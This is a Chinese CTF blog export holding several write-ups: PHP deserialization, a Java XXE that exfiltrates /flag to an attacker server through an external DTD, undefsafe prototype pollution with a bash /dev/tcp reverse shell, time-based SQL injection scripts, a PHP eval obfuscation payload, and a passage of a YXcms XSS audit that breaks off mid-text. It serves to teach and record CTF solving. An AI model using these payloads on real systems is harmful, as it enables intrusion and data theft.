pTjMwJ9WiQHfvC+eFCFKTBpWQtmgjopgqtmPjfKfjSmdFLpeFf/Aj2ud3tN7u2+enC9+nLN8kgdWo29ZnCrOFCDdFCrOFoF= YXNobGtqIUBzajEyMjMlXiYqU2Q0NTY0c2Q4NzlzNWQxMmYyMzFhNDZxd2prZDEySjtESmpsO0xqTDtLSjg3MjkxMjg3MTM= 于是可以猜测是换了码表 利用我们已知明文和对应密文来推算替换的码表， 我们将已知的明文进行base64加密，然后将加密的结果和密文进行一个对比： a= &#39;pTjMwJ9WiQHfvC+eFCFKTBpWQtmgjopgqtmPjfKfjSmdFLpeFf/Aj2ud3tN7u2+enC9+nLN8kgdWo29ZnCrOFCDdFCrOFoF=&#39; b=&#39;YXNobGtqIUBzajEyMjMlXiYqU2Q0NTY0c2Q4NzlzNWQxMmYyMzFhNDZxd2prZDEySjtESmpsO0xqTDtLSjg3MjkxMjg3MTM=&#39; list_a=[] for i in a: list_a.append(i) list_b=[] for i in b: list_b.append(i) nvs = zip(list_a,list_b) def deleteDuplicate(li): temp_list = list(set([str(i) for i in li])) li=[eval(i) for i in temp_list] return li print deleteDuplicate(nvs) 得到了如下的对应关系： [(&#39;d&#39;, &#39;x&#39;), (&#39;j&#39;, &#39;N&#39;), (&#39;8&#39;, &#39;s&#39;), (&#39;B&#39;, &#39;i&#39;), (&#39;k&#39;, &#39;O&#39;), (&#39;T&#39;, &#39;X&#39;), (&#39;H&#39;, &#39;B&#39;), (&#39;F&#39;, &#39;M&#39;), (&#39;9&#39;, &#39;t&#39;), (&#39;o&#39;, &#39;T&#39;), (&#39;M&#39;, &#39;o&#39;), (&#39;J&#39;, &#39;G&#39;), (&#39;W&#39;, &#39;q&#39;), (&#39;A&#39;, &#39;h&#39;), (&#39;p&#39;, &#39;Y&#39;), (&#39;Q&#39;, &#39;U&#39;), (&#39;q&#39;, &#39;c&#39;), (&#39;r&#39;, &#39;g&#39;), (&#39;u&#39;, &#39;Z&#39;), (&#39;v&#39;, &#39;a&#39;), (&#39;i&#39;, &#39;I&#39;), (&#39;D&#39;, &#39;k&#39;), (&#39;7&#39;, &#39;r&#39;), (&#39;N&#39;, &#39;p&#39;), (&#39;/&#39;, &#39;F&#39;), (&#39;K&#39;, &#39;l&#39;), (&#39;2&#39;, &#39;D&#39;), (&#39;e&#39;, &#39;y&#39;), (&#39;=&#39;, &#39;=&#39;), (&#39;g&#39;, &#39;0&#39;), (&#39;S&#39;, &#39;W&#39;), (&#39;n&#39;, &#39;S&#39;), (&#39;Z&#39;, &#39;L&#39;), (&#39;w&#39;, &#39;b&#39;), (&#39;O&#39;, &#39;3&#39;), (&#39;P&#39;, &#39;4&#39;), (&#39;C&#39;, &#39;j&#39;), (&#39;3&#39;, &#39;d&#39;), (&#39;m&#39;, &#39;Q&#39;), (&#39;f&#39;, &#39;z&#39;), (&#39;t&#39;, &#39;2&#39;), (&#39;L&#39;, &#39;m&#39;), (&#39;+&#39;, &#39;E&#39;)] 然后将密文中的字符进行替换， 对照发现还有几个字母的相对应的密文是未知的，分别是E I X s G z 然后根据，flag是uuid的性质，推测出来几位，然后进行手工验证，得到了flag 感觉也是运气比较好，尝试了几次就出来了 flag{1e3a2de5-1c02-4f4f-9b2e-a4afabdf01e6} 总结打过网鼎杯，才知道自己有多菜了，， 大佬们tql… 还要努力呀。。。。","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"2020网鼎杯第一场writeup","slug":"2020网鼎杯第一场writeup","date":"2020-05-10T12:46:36.000Z","updated":"2020-05-10T16:53:59.916Z","comments":true,"path":"2020/05/10/2020网鼎杯第一场writeup/","link":"","permalink":"http://yoursite.com/2020/05/10/2020网鼎杯第一场writeup/","excerpt":"","text":"前言网鼎杯第一场开始了，又是菜鸡自闭的一天。。。 刚开始一直不放web题，让做web的有点难受呀。 webAreUSerialz打开题目发现源码，是一个反序列化： &lt;?php include(&quot;flag.php&quot;); highlight_file(__FILE__); class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); } public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); } } private function write() { if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) { if(strlen((string)$this-&gt;content) &gt; 100) { $this-&gt;output(&quot;Too long!&quot;); die(); } $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); } else { $this-&gt;output(&quot;Failed!&quot;); } } private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res; } private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; } function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); } } function is_valid($s) { for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true; } if(isset($_GET{&#39;str&#39;})) { $str = (string)$_GET[&#39;str&#39;]; if(is_valid($str)) { $obj = unserialize($str); } } 阅读代码，发现是对文件的一个读写操作。。。 通过读写来得到flag… 这里有一个过滤。要求传递的字符串的ascii码在32~125之间： function is_valid($s) { for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true; } 这里有protected属性的参数，对其反序列化会有不可见字符串\\00,会被is_valid()检测出来。。。 protected $op; protected $filename; protected $content; php7.1以上的版本对属性类型不是特别的敏感。。。 可以不用\\00*\\00,直接用public属性就可以了。。。 这里__destruct()函数，就对$this-&gt;op === &quot;2&quot;这里使用了强相等。。 function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); } 可以是$this-&gt;op等于整形的2来进行绕过。。 构造： class FileHandler { public $op =2; public $filename=&#39;/etc/passwd&#39;; public $content; } $a = new FileHandler(); echo serialize($a); /?str=O:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:11:&quot;/etc/passwd&quot;;s:7:&quot;content&quot;;N;} 可以读到/etc/passwd文件，但是没读到flag.php 就猜测是路径不对。。。尝试了好多常见的路径都不行，最后在队友的提示下在/proc/self/cmdline里找到了文件的路径：/web/config/httpd.conf 猜测网站根目录为/web/html/flag.phppayload:/?str=O:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:18:&quot;/web/html/flag.php&quot;;s:7:&quot;content&quot;;N;} filejava打开题目，发现是一个文件上传类的题目： 尝试一下发现可以进行文件的上传，以及下载。。 在文件下载的地方，尝试发现可以进行任意文件下载： 通过命名规则，可以下载这些class文件。。 WEB-INF/classes/cn/abc/servlet/UploadServlet.class WEB-INF/classes/cn/abc/servlet/ListFileServlet.class WEB-INF/classes/cn/abc/servlet/DownloadServlet.class 然后通过在线的java class文件的反编译工具，进行反编译 在线反编译： 主要是 UploadServlet.java的代码 package cn.abc.servlet; import cn.abc.servlet.UploadServlet.1; import java.io.File; import java.io.FileOutputStream; import java.io.IOException; import java.io.InputStream; import java.util.Iterator; import java.util.List; import java.util.UUID; import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import org.apache.commons.fileupload.FileItem; import org.apache.commons.fileupload.FileUploadException; import org.apache.commons.fileupload.disk.DiskFileItemFactory; import org.apache.commons.fileupload.servlet.ServletFileUpload; import org.apache.poi.openxml4j.exceptions.InvalidFormatException; import org.apache.poi.ss.usermodel.Sheet; import org.apache.poi.ss.usermodel.Workbook; import org.apache.poi.ss.usermodel.WorkbookFactory; public class UploadServlet extends HttpServlet { private static final long serialVersionUID = 1L; protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { this.doPost(request, response); } protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String savePath = this.getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;); String tempPath = this.getServletContext().getRealPath(&quot;/WEB-INF/temp&quot;); File tempFile = new File(tempPath); if(!tempFile.exists()) { tempFile.mkdir(); } String message = &quot;&quot;; try { DiskFileItemFactory e = new DiskFileItemFactory(); e.setSizeThreshold(102400); e.setRepository(tempFile); ServletFileUpload upload = new ServletFileUpload(e); upload.setProgressListener(new 1(this)); upload.setHeaderEncoding(&quot;UTF-8&quot;); upload.setFileSizeMax(1048576L); upload.setSizeMax(10485760L); if(!ServletFileUpload.isMultipartContent(request)) { return; } List list = upload.parseRequest(request); Iterator var10 = list.iterator(); while(var10.hasNext()) { FileItem fileItem = (FileItem)var10.next(); String filename; String fileExtName; if(fileItem.isFormField()) { filename = fileItem.getFieldName(); fileExtName = fileItem.getString(&quot;UTF-8&quot;); } else { filename = fileItem.getName(); if(filename != null &amp;&amp; !filename.trim().equals(&quot;&quot;)) { fileExtName = filename.substring(filename.lastIndexOf(&quot;.&quot;) + 1); InputStream in = fileItem.getInputStream(); if(filename.startsWith(&quot;excel-&quot;) &amp;&amp; &quot;xlsx&quot;.equals(fileExtName)) { try { Workbook saveFilename = WorkbookFactory.create(in); Sheet realSavePath = saveFilename.getSheetAt(0); System.out.println(realSavePath.getFirstRowNum()); } catch (InvalidFormatException var20) { System.err.println(&quot;poi-ooxml-3.10 has something wrong&quot;); var20.printStackTrace(); } } String saveFilename1 = this.makeFileName(filename); request.setAttribute(&quot;saveFilename&quot;, saveFilename1); request.setAttribute(&quot;filename&quot;, filename); String realSavePath1 = this.makePath(saveFilename1, savePath); FileOutputStream out = new FileOutputStream(realSavePath1 + &quot;/&quot; + saveFilename1); byte[] buffer = new byte[1024]; boolean len = false; int len1; while((len1 = in.read(buffer)) &gt; 0) { out.write(buffer, 0, len1); } in.close(); out.close(); message = &quot;文件上传成功!&quot;; } } } } catch (FileUploadException var21) { var21.printStackTrace(); } request.setAttribute(&quot;message&quot;, message); request.getRequestDispatcher(&quot;/ListFileServlet&quot;).forward(request, response); } private String makeFileName(String filename) { return UUID.randomUUID().toString() + &quot;_&quot; + filename; } private String makePath(String filename, String savePath) { int hashCode = filename.hashCode(); int dir1 = hashCode &amp; 15; int dir2 = (hashCode &amp; 240) &gt;&gt; 4; String dir = savePath + &quot;/&quot; + dir1 + &quot;/&quot; + dir2; File file = new File(dir); if(!file.exists()) { file.mkdirs(); } return dir; } } 主要的代码： if(filename.startsWith(&quot;excel-&quot;) &amp;&amp; &quot;xlsx&quot;.equals(fileExtName)) { try { Workbook saveFilename = WorkbookFactory.create(in); Sheet realSavePath = saveFilename.getSheetAt(0); System.out.println(realSavePath.getFirstRowNum()); } catch (InvalidFormatException var20) { System.err.println(&quot; has something wrong&quot;); var20.printStackTrace(); } 发现是xlsx-streamer XXE 参考文档 这里给出了poi-ooxml-3.10发现正好符合： 利用方法这个文章说的很详细了，我就不多做阐述了 在自己的服务器上编写一个test.dtd文件 &lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt; &lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM &#39;http://xx.xx.xx.xx:8888/?file=%file;&#39;&gt;&quot;&gt; 创建一个excel-1.xlsx文件，对里面的[Content-Types].xml文件进行修改,添加如下代码 &lt;!DOCTYPE ANY[ &lt;!ENTITY % send SYSTEM &#39;http://xxx.xxx.xxx.xxx/test.dtd&#39;&gt; %send; %test; %back; ]&gt; 然后再服务器上监听8888端口，在题目上，上传excel-1.xlsx文件，就可以得到flag了.. notes这里直接给出来了源码： var express = require(&#39;express&#39;); var path = require(&#39;path&#39;); const undefsafe = require(&#39;undefsafe&#39;); const { exec } = require(&#39;child_process&#39;); var app = express(); class Notes { constructor() { this.owner = &quot;whoknows&quot;; this.num = 0; this.note_list = {}; } write_note(author, raw_note) { this.note_list[(this.num++).toString()] = {&quot;author&quot;: author,&quot;raw_note&quot;:raw_note}; } get_note(id) { var r = {} undefsafe(r, id, undefsafe(this.note_list, id)); return r; } edit_note(id, author, raw) { undefsafe(this.note_list, id + &#39;.author&#39;, author); undefsafe(this.note_list, id + &#39;.raw_note&#39;, raw); } get_all_notes() { return this.note_list; } remove_note(id) { delete this.note_list[id]; } } var notes = new Notes(); notes.write_note(&quot;nobody&quot;, &quot;this is nobody&#39;s first note&quot;); app.set(&#39;views&#39;, path.join(__dirname, &#39;views&#39;)); app.set(&#39;view engine&#39;, &#39;pug&#39;); app.use(express.json()); app.use(express.urlencoded({ extended: false })); app.use(express.static(path.join(__dirname, &#39;public&#39;))); app.get(&#39;/&#39;, function(req, res, next) { res.render(&#39;index&#39;, { title: &#39;Notebook&#39; }); }); app.route(&#39;/add_note&#39;) .get(function(req, res) { res.render(&#39;mess&#39;, {message: &#39;please use POST to add a note&#39;}); }) .post(function(req, res) { let author = req.body.author; let raw = req.body.raw; if (author &amp;&amp; raw) { notes.write_note(author, raw); res.render(&#39;mess&#39;, {message: &quot;add note sucess&quot;}); } else { res.render(&#39;mess&#39;, {message: &quot;did not add note&quot;}); } }) app.route(&#39;/edit_note&#39;) .get(function(req, res) { res.render(&#39;mess&#39;, {message: &quot;please use POST to edit a note&quot;}); }) .post(function(req, res) { let id = req.body.id; let author = req.body.author; let enote = req.body.raw; if (id &amp;&amp; author &amp;&amp; enote) { notes.edit_note(id, author, enote); res.render(&#39;mess&#39;, {message: &quot;edit note sucess&quot;}); } else { res.render(&#39;mess&#39;, {message: &quot;edit note failed&quot;}); } }) app.route(&#39;/delete_note&#39;) .get(function(req, res) { res.render(&#39;mess&#39;, {message: &quot;please use POST to delete a note&quot;}); }) .post(function(req, res) { let id = req.body.id; if (id) { notes.remove_note(id); res.render(&#39;mess&#39;, {message: &quot;delete done&quot;}); } else { res.render(&#39;mess&#39;, {message: &quot;delete failed&quot;}); } }) app.route(&#39;/notes&#39;) .get(function(req, res) { let q = req.query.q; let a_note; if (typeof(q) === &quot;undefined&quot;) { a_note = notes.get_all_notes(); } else { a_note = notes.get_note(q); } res.render(&#39;note&#39;, {list: a_note}); }) app.route(&#39;/status&#39;) .get(function(req, res) { let commands = { &quot;script-1&quot;: &quot;uptime&quot;, &quot;script-2&quot;: &quot;free -m&quot; }; for (let index in commands) { exec(commands[index], {shell:&#39;/bin/bash&#39;}, (err, stdout, stderr) =&gt; { if (err) { return; } console.log(`stdout: ${stdout}`); }); } res.send(&#39;OK&#39;); res.end(); }) app.use(function(req, res, next) { res.status(404).send(&#39;Sorry cant find that!&#39;); }); app.use(function(err, req, res, next) { console.error(err.stack); res.status(500).send(&#39;Something broke!&#39;); }); const port = 8080; app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:${port}`)) 发现是undefsafe原型链污染 先使用edit_note函数设置对象的author为我们要执行的命令，也就是反弹shell代码 bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/9999 0&gt;&amp;1， 在/edit_notepost提交id=__proto__.abc&amp;author=bash+-i+&gt;%26+/dev/tcp/xx.xx.xx.xx/9999+0&gt;%261&amp;raw=aaa 然后访问 /status app.route(&#39;/status&#39;) .get(function(req, res) { let commands = { &quot;script-1&quot;: &quot;uptime&quot;, &quot;script-2&quot;: &quot;free -m&quot; }; for (let index in commands) { exec(commands[index], {shell:&#39;/bin/bash&#39;}, (err, stdout, stderr) =&gt; { if (err) { return; } console.log(`stdout: ${stdout}`); }); } res.send(&#39;OK&#39;); res.end(); }) 在服务器上监听9999端口，即可反弹shell得到flag。。。 trace存在一个注册页面，然后就没有任何东西了。。。 测试的很头疼 测试发现，当数据超过20条就会显示WTF???rows&gt;20，能想到的就是通过报错，来阻止数据的添加。。通过测试注册用户名为2&#39;-if(1,cot(0),1)-&#39; 会返回Mysql Error 注册用户名为2&#39;-if(0,cot(0),1)-&#39; 会返回Success 可以传递2&#39;-if((bool),cot(0) or sleep(3),cot(0))-&#39;可以得到延时+报错的效果，不会进行注册操作。。 这里就很迷，测试的注入点没有问题，，字符也没被过滤，，就是跑不出来， 有可能是我的网不太好吧。。。 在加上心态有点崩，最后调试也没成功。。。附上菜鸡的有问题的脚本(求大佬指正)： import requests import time url = &quot;http://1bc30ba2b3f445d5b796e3b93e21954a718c043fa74540ee.cloudgame2.ichunqiu.com/register_do.php&quot; sql = &quot;database()&quot; flag = &quot;&quot; for i in range(1,43): for j in range(44,128): data = { &#39;username&#39;:&quot;&#39;-if(ascii(substr((&quot;+sql+&quot;),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;,cot(0) or sleep(4),cot(0))-&#39;&quot;, &#39;password&#39;:&quot;aa&quot; } try: result=requests.post(url,data=data,timeout=3) except requests.exceptions.ReadTimeout: flag+=chr(j) print flag break 总结这次题还不错，，学到了一些东西， 做题心态很重要。。。真的很重要。。。没心态，真的做不出来题目呀。。。。","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"CTFshow 36DCTF Web Writeup","slug":"CTFshow-36DCTF-Web-Writeup","date":"2020-05-05T09:38:10.000Z","updated":"2020-05-06T01:48:59.931Z","comments":true,"path":"2020/05/05/CTFshow-36DCTF-Web-Writeup/","link":"","permalink":"http://yoursite.com/2020/05/05/CTFshow-36DCTF-Web-Writeup/","excerpt":"","text":"前言ctfshow平台最近举办了36DCTF。。 听名字都让人热血沸腾的，嘿嘿 web你取吧打开页面，发现存在源码： &lt;?php error_reporting(0); show_source(__FILE__); $hint=file_get_contents(&#39;php://filter/read=convert.base64-encode/resource=hhh.php&#39;); $code=$_REQUEST[&#39;code&#39;]; $_=array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;m&#39;,&#39;n&#39;,&#39;l&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;\\~&#39;,&#39;\\^&#39;); $blacklist = array_merge($_); foreach ($blacklist as $blacklisted) { if (preg_match (&#39;/&#39; . $blacklisted . &#39;/im&#39;, $code)) { die(&#39;nonono&#39;); } } eval(&quot;echo($code);&quot;); ?&gt; 看来一下过滤了所有的字母、取反符号和异或符号 忽然想起来了递增的getshell的方式：但是这里对参数的处理是这样的eval(&quot;echo($code);&quot;);我们需要进行绕过处理 ?code=&quot; &quot;);$_=[];$_=@&quot;$_&quot;;$_=$_[&#39;!&#39;==&#39;@&#39;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);//","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"代码审计入门——YXcms","slug":"代码审计入门——YXcms","date":"2020-05-04T07:09:38.000Z","updated":"2020-05-05T07:48:10.145Z","comments":true,"path":"2020/05/04/代码审计入门——YXcms/","link":"","permalink":"http://yoursite.com/2020/05/04/代码审计入门——YXcms/","excerpt":"","text":"前言一直想尝试审计一个cms，但是因为各种原因，一直搁置了。尝试分析一下YXCMS。。。 相关环境源码信息 : Yxcms php建站系统 1.4.7本地环境 : phpstudy2018下载地址 : 175.6.244.211:88/uploads/userup/1596/YXcmsApp1.4.7.zip 安装环境具体的安装和使用的详细可以上官网查看https://www.kancloud.cn/yongheng/yxcms YXcms代码审计YXcms目录结构 YXcms目录结构 data 存放备份数据 protected 网站程序核心文件夹 public 存放css、images、js、swf等模板公用文件 upload 存放上传文件 .htaccess apache伪静态规则文件 httpd.ini iis伪静态规则文件 index.php 网站入口 robots.txt robots协议 升级日志.txt 详细升级日志记录文件 protected文件夹一些重要的路径： protected/base 控制器、模型以及接口的父类 protected/cache 数据库缓存、模板缓存等 protected/include canphp核心 protected/config.php 系统全局配置 protected/core.php 系统核心函数 protected/apps 存放应用 protected/apps/admin 后台 protected/apps/default 前台 protected/apps/member 会员中心 protected/apps/install 系统安装 YXcms1.4.7是mvc路由模式开发的。。。这个版本后台有好几个严重漏洞，前台有一个储存型XSS，要利用也需与管理员交互。 我们一个一个来进行分析。。。 前台存储型XSS漏洞复现前台有留言板的功能，进行测试： 当管理员在后台查看留言的时候，就能触发xss： 可以通过这个xss来获取管理员的cookie，从而进入网站后台。。 代码分析让我们看一下代码的实现：首先前台留言板的代码： 前台的文件源码protected/apps/default/controller/columnController.php public function index() { $ename=in($_GET[&#39;col&#39;]); if(empty($ename)) throw new Exception(&#39;栏目名不能为空~&#39;, 404); $sortinfo=model(&#39;sort&#39;)-&gt;find(&quot;ename=&#39;{$ename}&#39;&quot;,&#39;id,name,ename,path,url,type,deep,method,tplist,keywords,description,extendid&#39;); $path=$sortinfo[&#39;path&#39;].&#39;,&#39;.$sortinfo[&#39;id&#39;]; $deep=$sortinfo[&#39;deep&#39;]+1; $this-&gt;col=$ename; switch ($sortinfo[&#39;type&#39;]) { case 1://文章 $this-&gt;newslist($sortinfo,$path,$deep); break; case 2://图集 $this-&gt;photolist($sortinfo,$path,$deep); break; case 3://单页 $this-&gt;page($sortinfo,$path,$deep); break; case 4://应用 break; case 5://自定义 break; case 6://表单 $this-&gt;extend($sortinfo,$path,$deep); break; default: throw new Exception(&#39;未知的栏目类型~&#39;, 404); break; } } ... protected function extend($sortinfo,$path,$deep) { $tableid=$sortinfo[&#39;extendid&#39;]; if(empty($tableid)) $this-&gt;error(&#39;表单栏目不存在~&#39;); $tableinfo = model(&#39;extend&#39;)-&gt;select(&quot;id=&#39;{$tableid}&#39; OR pid=&#39;{$tableid}&#39;&quot;,&#39;id,tableinfo,name,type,defvalue&#39;,&#39;pid,norder DESC&#39;); if(empty($tableinfo)) $this-&gt;error(&#39;自定义表不存在~&#39;); $urls=explode(&#39;|&#39;, $sortinfo[&#39;url&#39;]); // var_dump($tableinfo); // var_dump($urls); // exit(); if (!$this-&gt;isPost()) { ... }else{ session_starts(); $verify=session(&#39;verify&#39;); session(&#39;verify&#39;,null); if(empty($verify) || $_POST[&#39;checkcode&#39;]!=$verify) $this-&gt;error(&#39;验证码错误，请重新输入&#39;); for($i=1;$i&lt;count($tableinfo);$i++){ if(is_array($_POST[$tableinfo[$i][&#39;tableinfo&#39;]])){ $data[$tableinfo[$i][&#39;tableinfo&#39;]]=in(deletehtml(implode(&#39;,&#39;,$_POST[$tableinfo[$i][&#39;tableinfo&#39;]]))); $data[$tableinfo[$i][&#39;tableinfo&#39;]]=$data[$tableinfo[$i][&#39;tableinfo&#39;]]?in(deletehtml($data[$tableinfo[$i][&#39;tableinfo&#39;]])):&#39;&#39;; }else{ if(strlen($_POST[$tableinfo[$i][&#39;tableinfo&#39;]])&gt;65535) $this-&gt;error(&#39;提交内容超过限制长度~&#39;); $data[$tableinfo[$i][&#39;tableinfo&#39;]]=html_in($_POST[$tableinfo[$i][&#39;tableinfo&#39;]],true); } } $data[&#39;ip&#39;]=get_client_ip(); $data[&#39;ispass&#39;]=0; $data[&#39;addtime&#39;]=time(); if(empty($urls[1])) $jump=$_SERVER[&#39;HTTP_REFERER&#39;]; else{ $jurl=explode(&#39;,&#39;,$urls[1]); if(!empty($jurl[1])){ $arr=explode(&#39;/&#39;,$jurl[1]); if(!empty($arr)){ $canshu=array(); foreach ($arr as $vo) { $val=explode(&#39;=&#39;,$vo); $canshu[$val[0]]=$val[1]; } } } $jump=url($jurl[0],$canshu); } $mes=$urls[2]?$urls[2]:&#39;提交成功请等待审核~&#39;; if(model(&#39;extend&#39;)-&gt;Extin($tableinfo[0][&#39;tableinfo&#39;],$data)) $this-&gt;success($mes,$jump); else $this-&gt;error(&#39;提交失败~&#39;); } } 这里前端对xss过滤不完善。。只对tname参数进行了验证deletehtml和html_in deletehtml函数/protected/include/lib/common.function.php //去除html js标签 function deletehtml($document) { $document = trim($document); if (strlen($document) &lt;= 0) { return $document; } $search = array (&quot;&#39;&lt;script[^&gt;]*?&gt;.*?&lt;/script&gt;&#39;si&quot;, // 去掉 javascript &quot;&#39;&lt;[\\/\\!]*?[^&lt;&gt;]*?&gt;&#39;si&quot;, // 去掉 HTML 标记 &quot;&#39;([\\r\\n])[\\s]+&#39;&quot;, // 去掉空白字符 &quot;&#39;&amp;(quot|#34);&#39;i&quot;, // 替换 HTML 实体 &quot;&#39;&amp;(amp|#38);&#39;i&quot;, &quot;&#39;&amp;(lt|#60);&#39;i&quot;, &quot;&#39;&amp;(gt|#62);&#39;i&quot;, &quot;&#39;&amp;(nbsp|#160);&#39;i&quot; ); // 作为 PHP 代码运行 $replace = array (&quot;&quot;, &quot;&quot;, &quot;\\\\1&quot;, &quot;\\&quot;&quot;, &quot;&amp;&quot;, &quot;&lt;&quot;, &quot;&gt;&quot;, &quot; &quot; ); return @preg_replace ($search, $replace, $document); } html_in函数 对html代码进行xss识别，看是否存在危险的html标签对，并进行过滤使用htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。： /protected/include/lib/common.function.php //html代码输入 function html_in($str,$filter=false){ if($filter){ $str=RemoveXSS($str); } $str=htmlspecialchars($str); if(!get_magic_quotes_gpc()) { $str = addslashes($str); } return $str; } RemoveXSS函数 对一些危险的标签对 进行了过滤，使其不能进行正常的xss功能，： function RemoveXSS($val) { // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed // this prevents some character re-spacing such as &lt;java\\0script&gt; // note that you have to handle splits with \\n, \\r, and \\t later since they *are* allowed in some inputs $val = preg_replace(&#39;/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/&#39;, &#39;&#39;, $val); // straight replacements, the user should never need these since they&#39;re normal characters // this prevents like &lt;IMG SRC=@avascript:alert(&#39;XSS&#39;)&gt; $search = &#39;abcdefghijklmnopqrstuvwxyz&#39;; $search .= &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;; $search .= &#39;1234567890!@#$%^&amp;*()&#39;; $search .= &#39;~`&quot;;:?+/={}[]-_|\\&#39;\\\\&#39;; for ($i = 0; $i &lt; strlen($search); $i++) { // ;? matches the ;, which is optional // 0{0,7} matches any padded zeros, which are optional and go up to 8 chars // @ @ search for the hex values $val = preg_replace(&#39;/(&amp;#[xX]0{0,8}&#39;.dechex(ord($search[$i])).&#39;;?)/i&#39;, $search[$i], $val); // with a ; // @ @ 0{0,7} matches &#39;0&#39; zero to seven times $val = preg_replace(&#39;/(&amp;#0{0,8}&#39;.ord($search[$i]).&#39;;?)/&#39;, $search[$i], $val); // with a ; } // now the only remaining whitespace attacks are \\t, \\n, and \\r $ra1 = Array(&#39;javascript&#39;, &#39;vbscript&#39;, &#39;expression&#39;, &#39;applet&#39;, &#39;meta&#39;, &#39;xml&#39;, &#39;blink&#39;, &#39;link&#39;, &#39;style&#39;, &#39;script&#39;, &#39;embed&#39;, &#39;object&#39;, &#39;iframe&#39;, &#39;frame&#39;, &#39;frameset&#39;, &#39;ilayer&#39;, &#39;layer&#39;, &#39;bgsound&#39;, &#39;title&#39;, &#39;base&#39;); $ra2 = Array(&#39;onabort&#39;, &#39;onactivate&#39;, &#39;onafterprint&#39;, &#39;onafterupdate&#39;, &#39;onbeforeactivate&#39;, &#39;onbeforecopy&#39;, &#39;onbeforecut&#39;, &#39;onbeforedeactivate&#39;, &#39;onbeforeeditfocus&#39;, &#39;onbeforepaste&#39;, &#39;onbeforeprint&#39;, &#39;onbeforeunload&#39;, &#39;onbeforeupdate&#39;, &#39;onblur&#39;, &#39;onbounce&#39;, &#39;oncellchange&#39;, &#39;onchange&#39;, &#39;onclick&#39;, &#39;oncontextmenu&#39;, &#39;oncontrolselect&#39;, &#39;oncopy&#39;, &#39;oncut&#39;, &#39;ondataavailable&#39;, &#39;ondatasetchanged&#39;, &#39;ondatasetcomplete&#39;, &#39;ondblclick&#39;, &#39;ondeactivate&#39;, &#39;ondrag&#39;, &#39;ondragend&#39;, &#39;ondragenter&#39;, &#39;ondragleave&#39;, &#39;ondragover&#39;, &#39;ondragstart&#39;, &#39;ondrop&#39;, &#39;onerror&#39;, &#39;onerrorupdate&#39;, &#39;onfilterchange&#39;, 